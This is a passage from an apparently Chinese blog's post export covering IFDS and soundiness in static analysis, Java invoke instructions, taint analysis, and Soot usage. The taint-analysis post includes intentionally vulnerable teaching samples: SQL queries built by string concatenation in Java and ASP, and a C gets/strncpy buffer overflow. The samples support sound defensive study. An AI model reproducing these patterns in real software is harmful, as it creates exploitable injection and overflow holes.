0&gt;是否能到达&lt;p, a&gt;。如果没有0→0的边，则无法完全连通，所以0→0又称为Glue Edge。 构建G#示例：最后能从&lt;smain, 0&gt;→&lt;emain, g&gt;（要通过realizable paths），则emain点的g是可能未初始化的。emain处的x和nPrint(a,g)处的g都是初始化过的，因为从smain不可达（不能通过non-realizable paths——绿色线）。 不可达原因：括号没匹配上，return-site没有匹配 IFDS步骤三：Tabulation算法——判断是否可达 Tabulation算法工作原理：假设只关注1个data fact，p’ 被 p 和 p’’ 同时调用。 p’的入口点一定是自己连自己，一定可达 处理括号匹配：每次处理到返回点ep’时，开始括号匹配（call-to-return匹配），找到调用点(Callp， Callp’’)和相应的返回点(Retp，Retp’’)。 处理总结边——SummaryEdge：总结边—&lt;Call,dm&gt;→&lt;Ret,dn&gt;，表示dm通过调用p’能到达pn，用来避免重复处理p和p’’中调用同一函数p’（优化）。 Tabulation算法优点：传统的worklist算法是利用了queue的特性，每次循环只考虑与被改变值结点的相关结点。论文中用于解决图可达问题的Tabulation 算法是基于worklist的动态规划算法，比传统worklist算法考虑interprocedure问题更精确也更省时。 Understanding the Distributivity of IFDS结论：不能用IFDS进行常量传播分析、指针分析。 原因：由IFDS的框架决定，一次只能处理1个变量。例如，表示若x和y都存在则会冲突，无法表示这种关系。不满足F(x^y)=F(x)^F(y)。 总结：给定语句S，如果输出取决于多个输入的data fact，则该分析不具备可分配性，不能用IFDS表达。IFDS中，每个data fact（圆圈）与其传播（边）都可以各自处理，且不影响最终结果。 IDE：IDE（Interprocedural，Distributive，Environment problem）作为IFDS的优化，可以解决infinite的问题，但是仍需满足distributive。 指针分析：箭头表示变量是否指向new T，但由于缺乏别名信息alias(x,y) / alias(x.f,y.f)，导致分析结果错误。也就是说正常应该有一个红色的虚线边，但是由于缺少了别名分析，导致分析错误。 传统IFDS是每次只感知一个input，对于这个例子来说需要同时知道x和y是否指向同一个内存对象，这其实是两个input。就不满足可分配的必要特性，所以可以说指针分析是non-distributive的。 归根结底，要想在IFDS中获取别名信息alias(x,y)，需要考虑多个输入data fact（x、y），所以不能用IFDS。 16Soundness &amp; Soundiness分析真实复杂程序时，产生的问题都与Soundiness有关，是最前沿的topic之一。 Soundness：保守估计，分析结果能包含程序所有可能的执行，OVER。学术界和工业界都做不到。 复杂语言特性：导致分析结果不精确。 Java：Reflection, native code, dynamic class loading, etc. JavaScript：eval（执行任意命令）, document object model (DOM，和DOM加护), etc. C/C++：Pointer arithmetic（指针地址加或乘操作）, function pointers, etc. 现状：有些文章不提这类问题，或者随意一提（如eval）。极具误导性，导致相信该工具很sound，且影响专家的评判。 Soundiness：直观相信的”truth”，但没有任何事实和证据。 sound analysis：分析大部分都是sound的，并且对于hard-to-analysis部分来说，明确说出来是怎么处理的。 词语对比： sound analysis：能捕捉所有动态运行行为，纯理想化分析。 soundy analysis：目标是捕捉所有动态行为，但对于某些复杂语言特性可以unsound。 unsound analysis：为了效率、精度，故意不处理某些行为。 复杂语言特性一：Java Reflection—反射什么是Java反射Java Reflection：反射机制很重要的一点就是“运行时”，其使得我们可以在程序运行时加载、探索以及使用编译期间完全未知的 .class 文件。换句话说，Java 程序可以加载一个运行时才得知名称的 .class 文件，然后获悉其完整构造，并生成其对象实体、或对其 fields（变量）设值、或调用其 methods（方法）。 三个MetaObject： Class-class，Method-method，Field-field分别对应。 反射世界虽然复杂，但是离不开第一步入口：获取Class对象。 说明：非反射代码在编译时就能确定对象；反射代码在运行时才确定对象，如c指向什么，”Person”也可能是的字符串指针，很难静态分析。分析该类代码很有必要，如弄清对象到底调用了哪个目标函数、对象域的指向关系等。 分析方法分析方法：String Contant analysis + Pointer Analysis（Reflection Analysis for Java——APLAS 2005）。 示例：目标是分析m调用的目标函数。 找到m的定义点，即Method m = c.getMethod(mName, ...); 通过String Contant analysis找到mName指向内容 通过指针分析找到c指向内容 通过String Contant analysis找到cName指向内容 知道了是调用Person类的setName函数 问题：若字符串的值无法通过静态分析得到，则反射目标不能求解。Eg，字符串来自配置文件、网络、命令行、复杂字符串处理、动态生成、加密。 改进解决方法：Type Inference + String analysis + Pointer Analysis（Self-Inferencing Reflection Resolution for Java——ECOOP 2014，李樾，谭添老师的成果）。 在创造点不可推，但在使用点可推。 示例：【搜集隐藏线索】类名依赖cmd参数，解不出来；但在调用点，通过Java的类型系统推导parameters，发现parameters是this指针。 推出结论就是，175行的目标函数肯定有1个参数，且这个参数的声明类型要么是FrameworkCommandInterpreter要么是其子类。 结果推断出50个反射目标函数，48个为true。 最新工作：Understanding and Analyzing Java Reflection (TOSEM 2019) Yue Li, Tian Tan, Jingling Xue。不仅求解反射对象更准确更多，而且能说出哪里解的不准。 常用方法：Taming reflection: Aiding static analysis in the presence of reflection and custom class loaders (ICSE 2011)。利用动态分析来解，缺点是测试用例的覆盖路径有限，优点是只要解出来，结果都为真。 复杂语言特性二：Native CodeNative Code：一个Native Method就是一个java调用非java代码的接口。该方法的实现由非java语言实现，已被编译为特定于处理器的机器码的代码，这些代码可以直接被虚拟机执行，与字节码的区别：虚拟机是一个把通用字节码转换成用于特定处理器的本地代码的程序，比如C。这个特征并非java所特有，很多其它的编程语言都有这一机制，比如在C++中，你可以用extern “C”告知C++编译器去调用一个C的函数。 Java Native Interface(JNI)：是一种编程框架（函数模型，反映参数格式等），使得Java虚拟机中的Java程序可以调用本地应用/或库，也可以被其他程序调用。 本地程序一般是用其它语言（C、C++或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序。 也就是说，Java应用或者Lib包都是class文件，可以通过JVM内部的JNI接口与Native App&amp;Lib原生来交互。 示例：先加载Native库，声明Native函数，*env变量可以在Native代码中用于创建对象、访问域、调用Java中的方法等，支持230个JNI函数。问题是跨语言之后，如何静态分析je.guessMe()这个调用？ 方法：对重要的native code手动建模。例如，对经常调用的arraycopy()函数进行建模，建模后就是一个拷贝循环，但从指针分析角度来讲，看到这个循环，我们就把数组指针进行传递。 参考bsauce","categories":[{"name":"静态分析","slug":"静态分析","permalink":"https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"}],"tags":[{"name":"静态分析基础","slug":"静态分析基础","permalink":"https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"}]},{"title":"Java方法调用","slug":"Java方法调用","date":"2020-08-02T07:47:04.000Z","updated":"2021-06-18T11:47:01.587Z","comments":true,"path":"Java方法调用/","link":"","permalink":"https://0range228.github.io/Java%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8/","excerpt":"序言 返景入深林，复照青苔上。 前一阵分析Jimple文件，看到好多种invoke语句，今天来复习一下。","text":"序言 返景入深林，复照青苔上。 前一阵分析Jimple文件，看到好多种invoke语句，今天来复习一下。 两种链接静态链接当一个class文件被装进JVM内部时，如果被调用的目标方法在编译期可知，且运行时保持不变。 动态链接如果调用的方法在编译器无法确定下来，只能在运行期间确定下来（重写/多态/继承）。 两种方法非虚方法静态方法static，私有方法private，final方法，构造器&lt;init&gt;，父类方法super.xx() 虚方法多态，重写，重载。 五种invokeinvokestatic调用静态方法static，解析阶段唯一确定方法的版本。 invokespecial调用促使构造器方法&lt;init&gt;，私有方法private，父类方法super.xx()。 解析阶段确定唯一方法的版本。 invokevirtual虚方法，以及final方法。 invokeinterface调用xx接口 invokedynamic动态解析出需要调用的方法，然后执行。 lambda表达式。 说明 非虚方法：invokestatic，invokespecial 虚方法：invokevirtual，invokedynamic 特殊说明：final方法其实很特殊，他是唯一一个invokevirtual，却仍然是非虚方法。 invokedynamic主要还是应用于lambda表达式，比较少见 实例父类Father： 123456789101112131415class Father&#123; public Father()&#123; System.out.println(\"Father init method.\"); &#125; public static void showStatic(String str)&#123; System.out.println(\"Father static method.\"+str); &#125; public final void showFinal()&#123; System.out.println(\"Father final method.\"); &#125; public void showCommon()&#123; System.out.println(\"Father common method.\"); &#125;&#125; 子类Son继承了Father父类： 1234567891011121314151617181920212223242526public class Son extends Father&#123; public Son() &#123; super(); &#125; public Son(int age)&#123; this(); &#125; public static void showStatic(String str)&#123; System.out.println(\"Son staitc method.\"+str); &#125; private void showPrivate(String str)&#123; System.out.println(\"Son private method\"+str); &#125; public void show()&#123; showStatic(\"niceday\"); Father.showStatic(\"good\"); showPrivate(\"hello\"); super.showCommon(); super.showFinal(); &#125; public static void main(String[] args) &#123; Son son = new Son(); son.show(); &#125;&#125; 说明： 重点还是各种方法的调用。 第一个showStatic(&quot;niceday&quot;)是Son子类自己的static方法。 第二个Father.showStatic(&quot;good&quot;)，是父类的static方法。 第三个showPrivate(&quot;hello&quot;)，是子类自己的private方法。 第四个和第五个方法都是继承父类的方法，分别是父类的正常方法和父类的final方法。 下面看一下字节码，对应关系如下：","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java基础","slug":"Java基础","permalink":"https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"}]},{"title":"污点分析简单介绍","slug":"污点分析简单介绍","date":"2020-07-20T13:28:07.000Z","updated":"2020-07-20T14:20:19.741Z","comments":true,"path":"污点分析简单介绍/","link":"","permalink":"https://0range228.github.io/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/","excerpt":"序言 明月几时有，把酒问青天。 今天来总结污点分析，写点笔记。","text":"序言 明月几时有，把酒问青天。 今天来总结污点分析，写点笔记。 污点分析基本原理 &amp; &lt;sources,sinks,sanitizers&gt;污点分析是一种跟踪并分析污点信息在程序中流动的技术。 在漏洞分析中，使用污点分析技术将所感兴趣的数据（通常来自程序的外部输入）标记为污点数据，然后通过跟踪和污点数据相关的信息的流向，可以知道它们是否会影响某些关键的程序操作，进而挖掘程序漏洞。 即将程序是否存在某种漏洞的问题转化为污点信息是否会被 Sink 点上的操作所使用的问题。 污点分析常常包括以下几个部分： 识别污点信息在程序中的产生点（Source点）并对污点信息进行标记 利用特定的规则跟踪分析污点信息在程序中的传播过程 在一些关键的程序点（Sink点）检测关键的操作是否会受到污点信息的影响 污点分析可以抽象成一个三元组&lt;sources,sinks,sanitizers&gt;的形式，其中，source 即污点源，代表直接引入不受信任的数据或者机密数据到系统中； sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性)； sanitizer即无害处理，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。 污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点。如果不能，说明系统是信息流安全的；否则，说明系统产生了隐私数据泄露或危险数据操作等安全问题。 举个例子： 12345678[...]scanf(\"%d\", &amp;x); // Source 点，输入数据被标记为污点信息，并且认为变量 x 是污染的[...]y = x + k; // 如果二元操作的操作数是污染的，那么操作结果也是污染的，所以变量 y 也是污染的[...]x = 0; // 如果一个被污染的变量被赋值为一个常数，那么认为它是未污染的，所以 x 转变成未污染的[...]while (i &lt; y) // Sink 点，如果规定循环的次数不能受程序输入的影响，那么需要检查 y 是否被污染 然而污点信息不仅可以通过数据依赖传播，还可以通过控制依赖传播。我们将通过数据依赖传播的信息流称为显式信息流，将通过控制依赖传播的信息流称为隐式信息流。 举个例子： 1234if (x &gt; 0) y = 1;else y = 0; 变量 y 的取值依赖于变量 x 的取值，如果变量 x 是污染的，那么变量 y 也应该是污染的。 通常我们将使用污点分析可以检测的程序漏洞称为污点类型的漏洞，例如 SQL 注入漏洞： 1234567String user = getUser();String pass = getPass();String sqlQuery = \"select * from login where user='\" + user + \"' and pass='\" + pass + \"'\";Statement stam = con.createStatement();ResultSetrs = stam.executeQuery(sqlQuery);if (rs.next()) success = true; 在进行污点分析时，将变量 user 和 pass 标记为污染的，由于变量 sqlQuery 的值受到 user 和 pass 的影响，所以将 sqlQuery 也标记为污染的。程序将变量 sqlQuery 作为参数构造 SQL 操作语句，于是可以判定程序存在 SQL 注入漏洞。 所以主要分为两种： 基于数据流的污点分析。在不考虑隐式信息流的情况下，可以将污点分析看做针对污点数据的数据流分析。根据污点传播规则跟踪污点信息或者标记路径上的变量污染情况，进而检查污点信息是否影响敏感操作。 基于依赖关系的污点分析。考虑隐式信息流，在分析过程中，根据程序中的语句或者指令之间的依赖关系，检查 Sink 点处敏感操作是否依赖于 Source 点处接收污点信息的操作。 现有的识别污点源和汇聚点的方法可以大致分成 3 类: 使用启发式的策略进行标记,例如把来自程序外部输入的数据统称为“污点”数据,保守地认为这些数据有可能包含恶意的攻击数据(如 PHP Aspis)； 根据具体应用程序调用的 API 或者重要的数据类型,手工标记源和汇聚点(如 DroidSafe，Soot)； 使用统计或机器学习技术自动地识别和标记污点源及汇聚点。 方法实现静态污点分析系统首先对程序代码进行解析，获得程序代码的中间表示，然后在中间表示的基础上对程序代码进行控制流分析等辅助分析，以获得需要的控制流图、调用图等。 在辅助分析的过程中，系统可以利用污点分析规则在中间表示上识别程序中的 Source 点和 Sink 点。 最后检测系统根据污点分析规则，利用静态污点分析检查程序是否存在污点类型的漏洞。 基于数据流的污点分析在基于数据流的污点分析中，常常需要一些辅助分析技术，例如别名分析、取值分析等，来提高分析精度。辅助分析和污点分析交替进行，通常沿着程序路径的方向分析污点信息的流向，检查 Source 点处程序接收的污点信息是否会影响到 Sink 点处的敏感操作。 过程内intra的分析中，按照一定的顺序分析过程内的每一条语句或者指令，进而分析污点信息的流向。 记录污点信息。在静态分析层面，程序变量的污染情况为主要关注对象。为记录污染信息，通常为变量添加一个污染标签。最简单的就是一个布尔型变量，表示变量是否被污染。更复杂的标签还可以记录变量的污染信息来自哪些 Source 点，甚至精确到 Source 点接收数据的哪一部分。当然也可以不使用污染标签，这时我们通过对变量进行跟踪的方式达到分析污点信息流向的目的。例如使用栈或者队列来记录被污染的变量。 程序语句的分析。在确定如何记录污染信息后，将对程序语句进行静态分析。通常我们主要关注赋值语句、控制转移语句以及过程调用语句三类。 赋值语句。 对于简单的赋值语句，形如 a = b 这样的，记录语句左端的变量和右端的变量具有相同的污染状态。程序中的常量通常认为是未污染的，如果一个变量被赋值为常量，在不考虑隐式信息流的情况下，认为变量的状态在赋值后是未污染的。 对于形如 a = b + c 这样带有二元操作的赋值语句，通常规定如果右端的操作数只要有一个是被污染的，则左端的变量是污染的（除非右端计算结果为常量）。 对于和数组元素相关的赋值，如果可以通过静态分析确定数组下标的取值或者取值范围，那么就可以精确地判断数组中哪个或哪些元素是污染的。但通常静态分析不能确定一个变量是污染的，那么就简单地认为整个数组都是污染的。 对于包含字段或者包含指针操作的赋值语句，常常需要用到指向分析的分析结果。 控制转移语句。 在分析条件控制转移语句时，首先考虑语句中的路径条件可能是包含对污点数据的限制，在实际分析中常常需要识别这种限制污点数据的条件，以判断这些限制条件是否足够包含程序不会受到攻击。如果得出路径条件的限制是足够的，那么可以将相应的变量标记为未污染的。 对于循环语句，通常规定循环变量的取值范围不能受到输入的影响。例如在语句 for (i = 1; i &lt; k; i++){} 中，可以规定循环的上界 k 不能是污染的。 过程调用语句。 可以使用过程间的分析或者直接应用过程摘要进行分析。污点分析所使用的过程摘要主要描述怎样改变与该过程相关的变量的污染状态，以及对哪些变量的污染状态进行检测。这些变量可以是过程使用的参数、参数的字段或者过程的返回值等。例如在语句 flag = obj.method(str); 中，str 是污染的，那么通过过程间的分析，将变量 obj 的字段 str 标记为污染的，而记录方法的返回值的变量 flag 标记为未污染的。 在实际的过程间分析中，可以对已经分析过的过程构建过程摘要。例如前面的语句，其过程摘要描述为：方法 method 的参数污染状态决定其接收对象的实例域 str 的污染状态，并且它的返回值是未受污染的。那么下一次分析需要时，就可以直接应用摘要进行分析。 代码的遍历。一般情况下，常常使用流敏感的方式或者路径敏感的方式进行遍历，并分析过程中的代码。如果使用流敏感的方式，可以通过对不同路径上的分析结果进行汇集，以发现程序中的数据净化规则。如果使用路径敏感的分析方式，则需要关注路径条件，如果路径条件中涉及对污染变量取值的限制，可认为路径条件对污染数据进行了净化，还可以将分析路径条件对污染数据的限制进行记录，如果在一条程序路径上，这些限制足够保证数据不会被攻击者利用，就可以将相应的变量标记为未污染的。 过程间的分析与数据流过程间分析类似，使用自底向上的分析方法，分析调用图中的每一个过程，进而对程序进行整体的分析。 基于依赖关系的污点分析在基于依赖关系的污点分析中，首先利用程序的中间表示、控制流图和过程调用图构造程序完整的或者局部的程序的依赖关系。在分析程序依赖关系后，根据污点分析规则，检测 Sink 点处敏感操作是否依赖于 Source 点。 分析程序依赖关系的过程可以看做是构建程序依赖图的过程。程序依赖图是一个有向图。它的节点是程序语句，它的有向边表示程序语句之间的依赖关系。程序依赖图的有向边常常包括数据依赖边和控制依赖边。在构建有一定规模的程序的依赖图时，需要按需地构建程序依赖关系，并且优先考虑和污点信息相关的程序代码。 实例分析在使用污点分析方法检测程序漏洞时，污点数据相关的程序漏洞是主要关注对象，如 SQL 注入漏洞、命令注入漏洞和跨站脚本漏洞等。 下面是一个存在 SQL 注入漏洞 ASP 程序的例子： 1234567891011121314&lt;% Set pwd = \"bar\" Set sql1 = \"SELECT companyname FROM \" &amp; Request.Cookies(\"hello\") Set sql2 = Request.QueryString(\"foo\") MySqlStuff pwd, sql1, sql2 Sub MySqlStuff(password, cmd1, cmd2) Set conn = Server.CreateObject(\"ADODB.Connection\") conn.Provider = \"Microsoft.Jet.OLEDB.4.0\" conn.Open \"c:/webdata/foo.mdb\", \"foo\", password Set rs = conn.Execute(cmd2) Set rs = Server.CreateObject(\"ADODB.recordset\") rs.Open cmd1, conn End Sub%&gt; 首先对这段代码表示为一种三地址码的形式，例如第 3 行可以表示为： 1234567a = \"SELECT companyname FROM \"b = \"hello\"param0 Requestparam1 bcallCookiesreturn csql1 = a &amp; c 解析完毕后，需要对程序代码进行控制流分析，这里只包含了一个调用关系（第 5 行）。 接下来，需要识别程序中的 Source 点和 Sink 点以及初始的被污染的数据。 具体的分析过程如下： 调用 Request.Cookies(“hello”) 的返回结果是污染的，所以变量 sql1 也是污染的。 调用 Request.QueryString(“foo”) 的返回结果 sql2 是污染的。 函数 MySqlStuff 被调用，它的参数 sql1，sql2 都是污染的。分了分析函数的处理过程，根据第 6 行函数的声明，标记其参数 cmd1，cmd2 是污染的。 第 10 行是程序的 Sink 点，函数 conn.Execute 执行 SQL 操作，其参数 cmd2 是污染的，进而发现污染数据从 Source 点传播到 Sink 点。因此，认为程序存在 SQL 注入漏洞 动态污点分析基本原理动态污点分析是在程序运行的基础上，对数据流或控制流进行监控，从而实现对数据在内存中的显式传播、数据误用等进行跟踪和检测。动态污点分析与静态污点分析的唯一区别在于静态污点分析技术在检测时并不真正运行程序，而是通过模拟程序的执行过程来传播污点标记，而动态污点分析技术需要运行程序，同时实时传播并检测污点标记。 动态污点分析技术可分为三个部分： 污点数据标记：程序攻击面是程序接受输入数据的接口集，一般由程序入口点和外部函数调用组成。在污点分析中，来自外部的输入数据会被标记为污点数据。根据输入数据来源的不同，可分为三类：网络输入、文件输入和输入设备输入。 污点动态跟踪：在污点数据标记的基础上，对进程进行指令粒度的动态跟踪分析，分析每一条指令的效果，直至覆盖整个程序的运行过程，跟踪数据流的传播。 动态污点跟踪通常基于以下三种机制 动态代码插桩：可以跟踪单个进程的污点数据流动，通过在被分析程序中插入分析代码，跟踪污点信息流在进程中的流动方向。 全系统模拟：利用全系统模拟技术，分析模拟系统中每条指令的污点信息扩散路径，可以跟踪污点数据在操作系统内的流动。 虚拟机监视器：通过在虚拟机监视器中增加分析污点信息流的功能，跟踪污点数据在整个客户机中各个虚拟机之间的流动。 污点动态跟踪通常需要影子内存（shadow memory）来映射实际内存的污染情况，从而记录内存区域和寄存器是否是被污染的。对每条语句进行分析的过程中，污点跟踪攻击根据影子内存判断是否存在污点信息的传播，从而对污点信息进行传播并将传播结果保存于影子内存中，进而追踪污点数据的流向。 一般情况下，数据移动类和算数类指令都将造成显示的信息流传播。为了跟踪污点数据的显示传播，需要在每个数据移动指令和算数指令执行前做监控，当指令的结果被其中一个操作数污染后，把结果数据对应的影子内存设置为一个指针，指向源污染点操作数指向的数据结构。 污点误用检查：在正确标记污点数据并对污点数据的传播进行实时跟踪后，就需要对攻击做出正确的检测即检测污点数据是否有非法使用的情况。 动态污点分析的优缺点： 优点：误报率较低，检测结果的可信度较高。 缺点： 漏报率较高：由于程序动态运行时的代码覆盖率决定的。 平台相关性较高：特定的动态污点分析工具只能够解决在特定平台上运行的程序。 资源消耗大：包括空间上和时间上。 方法实现污点数据标记污点数据通常主要是指软件系统所接受的外部输入数据，在计算机中，这些数据可能以内存临时数据的形式存储，也可能以文件的形式存储。当程序需要使用这些数据时，一般通过函数或系统调用来进行数据访问和处理，因此只需要对这些关键函数进行监控，即可得到程序读取或输出了什么污点信息。另外对于网络输入，也需要对网络操作函数进行监控。 识别出污点数据后，需要对污点进行标记。污点生命周期是指在该生命周期的时间范围内，污点被定义为有效。污点生命周期开始于污点创建时刻，生成污点标记，结束于污点删除时刻，清除污点标记。 污点创建 将来自于非可靠来源的数据分配给某寄存器或内存操作数时 将已经标记为污点的数据通过运算分配给某寄存器或内存操作数时 污点删除 将非污点数据指派给存放污点的寄存器或内存操作数时 将污点数据指派给存放污点的寄存器或内存地址时，此时会删除原污点，并创建新污点 一些会清除污点痕迹的算数运算或逻辑运算操作时 污点动态跟踪当污点数据从一个位置传递到另一个位置时，则认为产生了污点传播。污点传播规则： 指令类型 传播规则 举例说明 拷贝或移动指令 T(a)&lt;-T(b) mov a, b 算数运算指令 T(a)&lt;-T(b) add a, b 堆栈操作指令 T(esp)&lt;-T(a) push a 拷贝或移动类函数调用指令 T(dst)&lt;-T(src) call memcpy 清零指令 T(a)&lt;-false xor a, a 注：T(x) 的取值分为 true 和 false 两种，取值为 true 时表示 x 为污点，否则 x 不是污点。 对于污点信息流，通过污点跟踪和函数监控，已经能够进行污点信息流流动方向的分析。但由于缺少对象级的信息，仅靠指令级的信息流动并不能完全给出要分析的软件的确切行为。因此，需要在函数监控的基础上进行视图重建，如获取文件对象和套接字对象的详细信息，以方便进一步的分析工作。 根据漏洞分析的实际需求，污点分析应包括两方面的信息： 污点的传播关系，对于任一污点能够获知其传播情况。 对污点数据进行处理的所有指令信息，包括指令地址、操作码、操作数以及在污点处理过程中这些指令执行的先后顺序等。 污点动态跟踪的实现通常使用： 影子内存：真实内存中污点数据的镜像，用于存放程序执行的当前时刻所有的有效污点。 污点传播树：用于表示污点的传播关系。 污点处理指令链：用于按时间顺序存储与污点数据处理相关的所有指令。 当遇到会引起污点传播的指令时，首先对指令中的每个操作数都通过污点快速映射查找影子内存中是否存在与之对应的影子污点从而确定其是否为污点数据，然后根据污点传播规则得到该指令引起的污点传播结果，并将传播产生的新污点添加到影子内存和污点传播树中，同时将失效污点对应的影子污点删除。同时由于一条指令是否涉及污点数据的处理，需要在污点分析过程中动态确定，因此需要在污点处理指令链中记录污点数据的指令信息。 污点误用检查污点敏感点，即 Sink 点，是污点数据有可能被误用的指令或系统调用点，主要分为： 跳转地址：检查污点数据是否用于跳转对象，如返回地址、函数指针、函数指针偏移等。具体操作是在每个跳转类指令（如call、ret、jmp等）执行前进行监控分析，保证跳转对象不是污点数据所在的内存地址。 格式化字符串：检查污点数据是否用作printf系列函数的格式化字符串参数。 系统调用参数：检查特殊系统调用的特殊参数是否为污点数据。 标志位：跟踪标志位是否被感染，及被感染的标志位是否用于改变程序控制流。 地址：检查数据移动类指令的地址是否被感染。 在进行污点误用检查时，通常需要根据一些漏洞模式来进行检查，首先需要明确常见漏洞在二进制代码上的表现形式，然后将其提炼成漏洞模式，以更有效地指导自动化的安全分析。 动态污点分析的实例分析下面我们来看一个使用动态污点分析的方法检测缓冲区溢出漏洞的例子。 12345678910111213141516void fun(char *str)&#123; char temp[15]; printf(\"in strncpy, source: %s\\n\", str); strncpy(temp, str, strlen(str)); // Sink 点&#125;int main(int argc, char *argv[])&#123; char source[30]; gets(source); // Source 点 if (strlen(source) &lt; 30) fun(source); else printf(\"too long string, %s\\n\", source); return 0;&#125; 漏洞很明显， 调用 strncpy 函数存在缓冲区溢出。 程序接受外部输入字符串的二进制代码如下： 12345670x08048609 &lt;+51&gt;: lea eax,[ebp-0x2a]0x0804860c &lt;+54&gt;: push eax0x0804860d &lt;+55&gt;: call 0x8048400 &lt;gets@plt&gt;...0x0804862c &lt;+86&gt;: lea eax,[ebp-0x2a]0x0804862f &lt;+89&gt;: push eax0x08048630 &lt;+90&gt;: call 0x8048566 &lt;fun&gt; 程序调用 strncpy 函数的二进制代码如下： 1234567890x080485a1 &lt;+59&gt;: push DWORD PTR [ebp-0x2c]0x080485a4 &lt;+62&gt;: call 0x8048420 &lt;strlen@plt&gt;0x080485a9 &lt;+67&gt;: add esp,0x100x080485ac &lt;+70&gt;: sub esp,0x40x080485af &lt;+73&gt;: push eax0x080485b0 &lt;+74&gt;: push DWORD PTR [ebp-0x2c]0x080485b3 &lt;+77&gt;: lea eax,[ebp-0x1b]0x080485b6 &lt;+80&gt;: push eax0x080485b7 &lt;+81&gt;: call 0x8048440 &lt;strncpy@plt&gt; 首先，在扫描该程序的二进制代码时，能够扫描到 call，该函数会读入外部输入，即程序的攻击面。确定了攻击面后，我们将分析污染源数据并进行标记，即将 [ebp-0x2a] 数组（即源程序中的source）标记为污点数据。程序继续执行，该污染标记会随着该值的传播而一直传递。在进入 fun() 函数时，该污染标记通过形参实参的映射传递到参数 str 上。然后运行到 Sink 点函数 strncpy()。该函数的第二个参数即 str 和 第三个参数 strlen(str) 都是污点数据。最后在执行 strncpy() 函数时，若设定了相应的漏洞规则（目标数组小于源数组），则漏洞规则将被触发，检测出缓冲区溢出漏洞。 参考： 1 2","categories":[{"name":"污点分析","slug":"污点分析","permalink":"https://0range228.github.io/categories/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"}],"tags":[{"name":"污点分析基础","slug":"污点分析基础","permalink":"https://0range228.github.io/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"}]},{"title":"[soot]如何反编译类文件","slug":"soot-如何反编译类文件","date":"2020-07-19T07:42:06.000Z","updated":"2020-07-19T08:37:20.230Z","comments":true,"path":"soot-如何反编译类文件/","link":"","permalink":"https://0range228.github.io/soot-%E5%A6%82%E4%BD%95%E5%8F%8D%E7%BC%96%E8%AF%91%E7%B1%BB%E6%96%87%E4%BB%B6/","excerpt":"序言 江山留胜迹，我辈复登临。 今天继续跟Soot，来看如何反汇编class文件。","text":"序言 江山留胜迹，我辈复登临。 今天继续跟Soot，来看如何反汇编class文件。 Soot基本用途Soot有两个基本用途：它可以用作独立的命令行工具或Java编译器框架。 作为命令行工具，Soot可以： 反汇编类文件 汇编类文件 优化类文件 作为Java编译器框架，Soot可用作开发新优化的测试平台。然后，可以将这些新的优化添加到Soot命令行工具调用的优化基础集。添加的优化部分可以应用于单个类文件，也可以应用于整个应用程序。 Soot通过能够以各种不同形式处理类文件来完成这些无数的任务。目前，Soot接受来自以下来源的代码，并输出其任何中间表示： Java（字节码和Java 7之前的源代码），包括编译成Java字节码的其他语言，例如Scala Android字节码 简单的中间表示 Jasmin，低级别的中间表示。 通过使用-help选项调用Soot，可以看到输出格式： Soot中目前使用六个中间表示形式：baf，jimple，shimple，grimp，jasmin和classfile。每种形式的简要说明如下： baf 字节码的简化表示形式。用于检查Java字节码作为堆栈代码，但格式更好。有两种文本表示形式（一种缩写（.b文件），一种完整（.baf文件）。） jimple 键入3地址代码。用于执行优化和检查字节码的非常方便的表示形式。有两个文本表示形式（.jimp文件和.jimple文件。） shimple Jimple的SSA变体。有两个文本表示形式（.shimp文件和.shimple文件。） grimp 聚集的（相对于表达式树）jimple。检查反汇编代码的最佳中间表示。有两个文本表示形式（.grimp文件和.grimple文件。） jasmin 凌乱的汇编器格式。主要用于调试Soot。Jasmin文件以“ .jasmin”结尾。 classfiles 原始Java字节码格式。二进制（非文本）表示形式。通常的.class文件。 生成一个Jimple文件先实现一个简单的Jimple类： 1234567public class Hello&#123; public static void main(String[] args) &#123; System.out.println(\"Hello world!\"); &#125;&#125; 只需编译该类（使用javac或其他编译器），然后在Hello.class所在的目录中尝试以下命令。 1java soot.Main -cp CLASSPATH -f jimple Hello 1java -cp soot-4.2.1.jar soot.Main -cp . -f J -pp Hello 名为Hello.jimple的文件应包含： 12345678910111213141516171819202122public class Hello extends java.lang.Object&#123; public void &lt;init&gt;() &#123; Hello r0; r0 := @this: Hello; specialinvoke r0.&lt;java.lang.Object: void &lt;init&gt;()&gt;(); return; &#125; public static void main(java.lang.String[]) &#123; java.lang.String[] r0; java.io.PrintStream $r1; r0 := @parameter0: java.lang.String[]; $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;; virtualinvoke $r1.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(\"Hello world!\"); return; &#125;&#125; 例子：为Java基础类库生成baf文件接下来尝试为任何类文件生成.b，.baf，.jimp，.jimple，.grimp和.grimple文件。一个特别好的测试是JDK库中的类文件。所以像这样的命令： 1java -cp soot-4.2.1.jar soot.Main -cp . -f baf -pp java.lang.String 应该会产生一个文件java.lang.String.baf，其中包含以下格式的文本： 输出java文件Soot不仅可以产生.jimple文件还可以产生.java文件。如果–f dava用于反编译为Java，请确保该文件/lib/jce.jar位于Soot的类路径中。 举例： 1java -cp soot-4.2.1.jar soot.Main -cp . -f d -pp lll 该文件下有一个lll.class文件,直接选择-f d，将其变为java文件： 